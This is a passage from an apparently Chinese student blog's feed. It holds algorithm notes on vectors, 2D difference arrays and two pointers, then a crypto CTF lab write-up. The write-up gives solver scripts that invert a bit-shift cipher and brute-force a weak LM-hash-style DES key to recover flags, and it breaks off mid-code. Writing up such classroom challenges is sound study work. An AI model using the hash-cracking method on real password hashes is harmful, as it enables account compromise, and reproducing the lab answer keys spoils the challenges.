class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>)</span></span>;<br>vector&lt;<span class="hljs-type">int</span>&gt; a[<span class="hljs-number">10</span>];<br></code></pre></td></tr></table></figure><p>vector方法</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">a.size</span>();<span class="hljs-comment">//返回元素个数，时间复杂度是O(1)</span><br><span class="hljs-variable">a.empty</span>();<span class="hljs-comment">//判断是否为空</span><br><span class="hljs-variable">a.clear</span>();<span class="hljs-comment">//清空</span><br><span class="hljs-variable">a.front</span>();/<span class="hljs-function"><span class="hljs-title">back</span>();</span><br><span class="hljs-function"><span class="hljs-title">push_back</span>()/<span class="hljs-title">pop_back</span>()</span><br><span class="hljs-function"><span class="hljs-title">begin</span>()/<span class="hljs-title">end</span>()</span><br>支持比较运算<br></code></pre></td></tr></table></figure><p>系统为某一程序分配空间所需时间，与申请空间的大小无关，与申请次数有关</p>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法学习(一)</title>
    <link href="/post/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0(%E4%B8%80).html"/>
    <url>/post/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0(%E4%B8%80).html</url>
    
    <content type="html"><![CDATA[<h2 id="1-快速排序"><a href="#1-快速排序" class="headerlink" title="1.快速排序"></a>1.快速排序</h2><h2 id="2-合并排序"><a href="#2-合并排序" class="headerlink" title="2.合并排序"></a>2.合并排序</h2><h2 id="二维差分"><a href="#二维差分" class="headerlink" title="二维差分"></a>二维差分</h2><p>应用：将某一子矩阵同时加上或减去某一个数</p><p>差分数组b[][]:a[][]相当于b的前缀和，由a做差分得到b,由b做前缀和得到a</p><p>思想：和一维差分一样，关键不是在与数组的构造，而是在于更新数组,因为数组的构造就可以用更新操作来做</p><p>更新数组（即插入操作）如下图所示：</p><p>由于是对差分数组的操作，只用在b[x1][y1]+c就能实现之后所有矩阵+c，所以需要对绿色矩阵和黄色矩阵-c（b[x1][y2+1]-c  b[x2+1][y1]-c）,而这又使得黄色矩阵与绿色矩阵的相交的矩阵减去了两个c,故要再给其加一个c（b[x2+1][y2+1]+c）</p><script type="math/tex; mode=display">\begin{cases}b[x1][y1]+\equiv{c} \\b[x1][y2+1]-\equiv{c}\\b[x2+1][y1]-\equiv{c}\\b[x2+1][y2+1]+\equiv{c}\end{cases}</script><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202302212153978.png" alt="image-20230221215314945"></p><p>构造初始数组：</p><p>将b数组所有数初始看为0，在位上进行上述插入操作在(i,j)插入a[i][j],这样就能构造差分数组，因为插入操作不止在该位置插入该数，还会在其他部分减去该数造成的影响，相当于在执行b[i][j]=a[i][j]-a[i-1][j]-a[i][j-1]+a[i][j](即前缀和逆操作);</p><p>注意：a[0]，a[][0]，b[0]，b[][0]应该留出空间保持置为0,因为边界的也会按照算法向前取，不保留出空间的话会越界</p><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><span class="hljs-type">int</span> a[N][N],b[N][N];<br><span class="hljs-type">int</span> n,m,q;<br> <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x1,<span class="hljs-type">int</span> y1,<span class="hljs-type">int</span> x2,<span class="hljs-type">int</span> y2,<span class="hljs-type">int</span> c)</span></span>&#123;<br>b[x1][y1]+=c;<br>b[x1][y2+<span class="hljs-number">1</span>]-=c;<br>b[x2+<span class="hljs-number">1</span>][y1]-=c;<br>b[x2+<span class="hljs-number">1</span>][y2+<span class="hljs-number">1</span>]+=c;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;<br><br><span class="hljs-comment">//输入二维数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)&#123;<br>cin&gt;&gt;a[i][j];<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//构建差分数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)&#123;<br><span class="hljs-built_in">insert</span>(i,j,i,j,a[i][j]);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//执行q个操作</span><br><span class="hljs-keyword">while</span>(q--)&#123;<br><span class="hljs-type">int</span> x1,y1,x2,y2,c;<br>cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2&gt;&gt;c;<br><span class="hljs-built_in">insert</span>(x1,y1,x2,y2,c);<br>&#125;<br><br><span class="hljs-comment">//还原前缀和</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)&#123;<br>b[i][j]+=b[i<span class="hljs-number">-1</span>][j]+b[i][j<span class="hljs-number">-1</span>]-b[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//输出数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)&#123;<br>cout&lt;&lt;b[i][j]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout&lt;&lt;endl;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="双指针算法"><a href="#双指针算法" class="headerlink" title="双指针算法"></a>双指针算法</h2><p>1.两个类型：两个指针分别指向一个序列(合并排序)；两个指针指向同一个序列(快速排序)</p><p>2.核心思想：将朴素（暴力）算法优化到O(n)</p><p>3.双指针算法的模板</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br></code></pre></td></tr></table></figure><p>4.最长连续不重复子序列</p><p>2.n的二进制表示中的第k位置</p><p>思路：</p>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-lab6</title>
    <link href="/post/Crypto-lab6.html"/>
    <url>/post/Crypto-lab6.html</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto-Lab6"><a href="#Crypto-Lab6" class="headerlink" title="Crypto-Lab6"></a>Crypto-Lab6</h1><h2 id="1-BitDance"><a href="#1-BitDance" class="headerlink" title="1.BitDance"></a>1.BitDance</h2><p>描述：bit master</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span>  flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2int</span>(<span class="hljs-params">s:<span class="hljs-built_in">str</span></span>):<br>    res=[]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(s)%<span class="hljs-number">4</span>!=<span class="hljs-number">0</span>:<br>        s+=<span class="hljs-string">&#x27;@&#x27;</span>*(<span class="hljs-number">4</span>-(<span class="hljs-built_in">len</span>(s)%<span class="hljs-number">4</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">4</span>):<br>        tmp=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            tmp|=(<span class="hljs-built_in">ord</span>(s[i+j]))&lt;&lt;(<span class="hljs-number">8</span>*j)<br>        res.append(tmp)<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">x</span>):<br>    x^=(x&lt;&lt;<span class="hljs-number">17</span>)<br>    x&amp;=<span class="hljs-number">0xffffffff</span><br>    x^=(x&gt;&gt;<span class="hljs-number">15</span>)<br>    x&amp;=<span class="hljs-number">0xffffffff</span><br>    x=(x&gt;&gt;<span class="hljs-number">14</span>) | (x&lt;&lt;<span class="hljs-number">18</span>)<br>    x&amp;=<span class="hljs-number">0xffffffff</span><br>    x^=x&lt;&lt;<span class="hljs-number">8</span><br>    x&amp;=<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> x<br>m=str2int(flag.decode())<br>enc=[encrypt(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m]<br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment">#[3188477616, 3086410, 2064398162, 3417626223, 3420114310, 3339741026, 4212574670, 1627596168, 1216621608, 4236761464, 4080586276]</span><br></code></pre></td></tr></table></figure><p>思路:</p><p>加密的思路不难，就是过程比较复杂，各种异或，移位</p><p>加密方法：长度不是4的倍数用@补齐，4个字符一组，对4个字符逆序转成int型，加入数组中，再对数组中每个数进行encrypt()函数的处理</p><p>解密的关键就是对encrypt()函数找到解密的方法</p><p>以x^=(x&lt;&lt;17) x&amp;=0xffffffff 这一段为例</p><div class="table-container"><table><thead><tr><th></th><th>前15位</th><th>后17位</th></tr></thead><tbody><tr><td>x</td><td>x前15位</td><td>x后17位</td></tr><tr><td>x&lt;&lt;17</td><td>x后15位</td><td>00000000000000000（17个0）</td></tr><tr><td>异或结果(tmp)</td><td>x前15位^x后15位</td><td>x后17位</td></tr></tbody></table></div><p>所以对应解密为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">x后<span class="hljs-number">17</span>位=tmp&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">17</span>-<span class="hljs-number">1</span>)<br>x前<span class="hljs-number">15</span>位=(tmp&gt;&gt;<span class="hljs-number">17</span>)^(x后<span class="hljs-number">17</span>位&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">15</span>-<span class="hljs-number">1</span>))<br>x=(x前<span class="hljs-number">15</span>位&lt;&lt;<span class="hljs-number">17</span>)|x后<span class="hljs-number">17</span>位<br></code></pre></td></tr></table></figure><p>由此可以写出encrypt()的对应解密函数，逆过程解密即可</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de1</span>(<span class="hljs-params">x</span>):<br>x&amp;=<span class="hljs-number">0xffffffff</span><br>tmp=x<br>res1=tmp&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>)<br><span class="hljs-comment">#print(res1)</span><br>res2=res1^((tmp&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>-<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">8</span>)<br><span class="hljs-comment">#print((tmp&amp;(2**16-1))&gt;&gt;8)</span><br>res3=res2^((tmp&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">24</span>-<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">16</span>)<br>res4=res3^(tmp&gt;&gt;<span class="hljs-number">24</span>)<br>res_f=(res4&lt;&lt;<span class="hljs-number">24</span>)|(res3&lt;&lt;<span class="hljs-number">16</span>)|(res2&lt;&lt;<span class="hljs-number">8</span>)|res1<br><span class="hljs-keyword">return</span> res_f<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de2</span>(<span class="hljs-params">x</span>):<br>x&amp;=<span class="hljs-number">0xffffffff</span><br>x=(x&gt;&gt;<span class="hljs-number">18</span>)|(x&lt;&lt;<span class="hljs-number">14</span>)<br>x&amp;=<span class="hljs-number">0xffffffff</span><br><span class="hljs-keyword">return</span> x<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de3</span>(<span class="hljs-params">x</span>):<br>x&amp;=<span class="hljs-number">0xffffffff</span><br>tmp=x<br>res1=(tmp&gt;&gt;<span class="hljs-number">17</span>)<br>res2=((tmp&gt;&gt;<span class="hljs-number">2</span>)&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">15</span>-<span class="hljs-number">1</span>))^res1<br>res3=(tmp&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">2</span>-<span class="hljs-number">1</span>))^(res2&gt;&gt;<span class="hljs-number">13</span>)<br>res_f=(res1&lt;&lt;<span class="hljs-number">17</span>)|(res2&lt;&lt;<span class="hljs-number">2</span>)|res3<br><span class="hljs-keyword">return</span> res_f<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de4</span>(<span class="hljs-params">x</span>):<br>tmp=x<br>res1=tmp&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">17</span>-<span class="hljs-number">1</span>)<br>res2=(tmp&gt;&gt;<span class="hljs-number">17</span>)^(res1&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">15</span>-<span class="hljs-number">1</span>))<br>res_f=(res2&lt;&lt;<span class="hljs-number">17</span>)|res1<br><span class="hljs-keyword">return</span> res_f<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">x</span>):<br><span class="hljs-keyword">return</span> de4(de3(de2(de1(x))))<br><br>enc=[<span class="hljs-number">3188477616</span>, <span class="hljs-number">3086410</span>, <span class="hljs-number">2064398162</span>, <span class="hljs-number">3417626223</span>, <span class="hljs-number">3420114310</span>, <span class="hljs-number">3339741026</span>, <span class="hljs-number">4212574670</span>, <span class="hljs-number">1627596168</span>, <span class="hljs-number">1216621608</span>, <span class="hljs-number">4236761464</span>, <span class="hljs-number">4080586276</span>]<br>m=[decrypt(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc]<br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> m:<br>tmp=long_to_bytes(s)<br>tmp=<span class="hljs-built_in">list</span>(tmp)<br>tmp.reverse()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>res+=<span class="hljs-built_in">chr</span>(tmp[i])<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="2-Weak-H-sh"><a href="#2-Weak-H-sh" class="headerlink" title="2.Weak_H@sh"></a>2.Weak_H@sh</h2><p>描述：weak hash，crack it</p><p>提示：LM-HASH》 如果k小于7字节会怎么样</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span>  flag,k<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br>magic=<span class="hljs-string">b&quot;2022CUMT&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">My_Hash_Plus</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(s)&gt;<span class="hljs-number">14</span>:<br>        msg=s[:<span class="hljs-number">14</span>]<br>    <span class="hljs-keyword">else</span>:<br>        msg=s+<span class="hljs-string">&#x27;@&#x27;</span>*(<span class="hljs-number">14</span>-<span class="hljs-built_in">len</span>(s))<br>    L=msg[:<span class="hljs-number">7</span>]<br>    R=msg[<span class="hljs-number">7</span>:]<br>    kl=L[:<span class="hljs-number">3</span>]+<span class="hljs-string">&#x27;@&#x27;</span>+L[<span class="hljs-number">3</span>:]<br>    kr=R[:<span class="hljs-number">3</span>]+<span class="hljs-string">&#x27;@&#x27;</span>+R[<span class="hljs-number">3</span>:]<br>    <span class="hljs-built_in">print</span>(kl)<br>    <span class="hljs-built_in">print</span>(kr)<br>    des=DES.new(kl.encode(),DES.MODE_ECB)<br>    cl=des.encrypt(magic)<br>    des = DES.new(kr.encode(), DES.MODE_ECB)<br>    cr = des.encrypt(magic)<br>    <span class="hljs-keyword">return</span> ((cl+cr).<span class="hljs-built_in">hex</span>(),sha256(msg.encode()).hexdigest())<br><br><span class="hljs-keyword">assert</span> k[:<span class="hljs-number">3</span>]==<span class="hljs-string">&#x27;CTF&#x27;</span><br><span class="hljs-built_in">print</span>(My_Hash_Plus(k))<br>seed(k)<br>enc=[flag[i]^getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]<br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">(&#x27;a3be9fbb2169d2d55156741e9d552cc1&#x27;, &#x27;c4558413cfcfaaa24183a94fc245990b44b9585080f234fa6d89aaedbba08981&#x27;)</span><br><span class="hljs-string">[35, 33, 208, 39, 70, 31, 18, 191, 171, 111, 97, 116, 149, 159, 117, 119, 182, 28, 120, 129, 196, 229, 20, 241, 245, 207, 120, 108, 206, 159, 13, 219, 230, 119, 157, 38, 15, 180, 75, 228, 100, 247]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>从加密解构和提示就明显知道是window口令加密中的LM-hash加密，上课的时候说过这个的安全性不高，位数少，而且是可见字符，容易被爆破，而且这里还是不超过7位的情况，直接爆破，用sha值验证结果即可求出正确的k</p><p>设置和加密时一样的种子，getrandbits(8)的结果会和加密时相同，异或上密文就可以得到明文了</p><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br>magic=<span class="hljs-string">b&quot;2022CUMT&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">My_Hash_Plus_L</span>(<span class="hljs-params">s</span>):<br>    des=DES.new(s.encode(),DES.MODE_ECB)<br>    cl=des.encrypt(magic)<br>    <span class="hljs-keyword">return</span> (cl).<span class="hljs-built_in">hex</span>()<br><span class="hljs-comment">#assert k[:3]==&#x27;CTF&#x27;</span><br>l=<span class="hljs-string">&#x27;a3be9fbb2169d2d5&#x27;</span><br>k=<span class="hljs-string">&#x27;CTF@&#x27;</span><br>res1=[]<br><span class="hljs-keyword">for</span> j1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">97</span>):<br>    k1=<span class="hljs-built_in">chr</span>(j1)<br>    <span class="hljs-keyword">for</span> j2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">97</span>):<br>        k2=<span class="hljs-built_in">chr</span>(j2)<br>        <span class="hljs-keyword">for</span> j3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">97</span>):<br>            k3=<span class="hljs-built_in">chr</span>(j3)<br>            <span class="hljs-keyword">for</span> j4 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">97</span>):<br>                k4=<span class="hljs-built_in">chr</span>(j4) <br>                h1=k+k1+k2+k3+k4<br>                res_l=My_Hash_Plus_L(h1)<br>                <span class="hljs-keyword">if</span> res_l==l:<br>                    res1.append(h1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;res1=&#x27;</span>,res1)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">res1= [&#x27;CTF@DR@@&#x27;, &#x27;CTF@DR@A&#x27;, &#x27;CTF@DRA@&#x27;, &#x27;CTF@DRAA&#x27;, &#x27;CTF@DS@@&#x27;, &#x27;CTF@DS@A&#x27;, &#x27;CTF@DSA@&#x27;, &#x27;CTF@DSAA&#x27;, &#x27;CTF@ER@@&#x27;, &#x27;CTF@ER@A&#x27;, &#x27;CTF@ERA@&#x27;, &#x27;CTF@ERAA&#x27;, &#x27;CTF@ES@@&#x27;, &#x27;CTF@ES@A&#x27;, &#x27;CTF@ESA@&#x27;, &#x27;CTF@ESAA&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br>res_sha=<span class="hljs-string">&#x27;c4558413cfcfaaa24183a94fc245990b44b9585080f234fa6d89aaedbba08981&#x27;</span><br>res1= [<span class="hljs-string">&#x27;CTF@DR@@&#x27;</span>, <span class="hljs-string">&#x27;CTF@DR@A&#x27;</span>, <span class="hljs-string">&#x27;CTF@DRA@&#x27;</span>, <span class="hljs-string">&#x27;CTF@DRAA&#x27;</span>, <span class="hljs-string">&#x27;CTF@DS@@&#x27;</span>, <span class="hljs-string">&#x27;CTF@DS@A&#x27;</span>, <span class="hljs-string">&#x27;CTF@DSA@&#x27;</span>, <span class="hljs-string">&#x27;CTF@DSAA&#x27;</span>, <span class="hljs-string">&#x27;CTF@ER@@&#x27;</span>, <span class="hljs-string">&#x27;CTF@ER@A&#x27;</span>, <span class="hljs-string">&#x27;CTF@ERA@&#x27;</span>, <span class="hljs-string">&#x27;CTF@ERAA&#x27;</span>, <span class="hljs-string">&#x27;CTF@ES@@&#x27;</span>, <span class="hljs-string">&#x27;CTF@ES@A&#x27;</span>, <span class="hljs-string">&#x27;CTF@ESA@&#x27;</span>, <span class="hljs-string">&#x27;CTF@ESAA&#x27;</span>]<br>res=[]<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> res1:<br>L=s[:<span class="hljs-number">3</span>]<br>R=s[<span class="hljs-number">4</span>:]<br>res.append(L+R+<span class="hljs-string">&#x27;@&#x27;</span>*<span class="hljs-number">7</span>)<br><span class="hljs-comment">#print(res)</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> res:<br>tmp=sha256(s.encode()).hexdigest()<br><span class="hljs-keyword">if</span> tmp==res_sha:<br>k=s<br><span class="hljs-comment">#print(k)</span><br>enc=[<span class="hljs-number">35</span>, <span class="hljs-number">33</span>, <span class="hljs-number">208</span>, <span class="hljs-number">39</span>, <span class="hljs-number">70</span>, <span class="hljs-number">31</span>, <span class="hljs-number">18</span>, <span class="hljs-number">191</span>, <span class="hljs-number">171</span>, <span class="hljs-number">111</span>, <span class="hljs-number">97</span>, <span class="hljs-number">116</span>, <span class="hljs-number">149</span>, <span class="hljs-number">159</span>, <span class="hljs-number">117</span>, <span class="hljs-number">119</span>, <span class="hljs-number">182</span>, <span class="hljs-number">28</span>, <span class="hljs-number">120</span>, <span class="hljs-number">129</span>, <span class="hljs-number">196</span>, <span class="hljs-number">229</span>, <span class="hljs-number">20</span>, <span class="hljs-number">241</span>, <span class="hljs-number">245</span>, <span class="hljs-number">207</span>, <span class="hljs-number">120</span>, <span class="hljs-number">108</span>, <span class="hljs-number">206</span>, <span class="hljs-number">159</span>, <span class="hljs-number">13</span>, <span 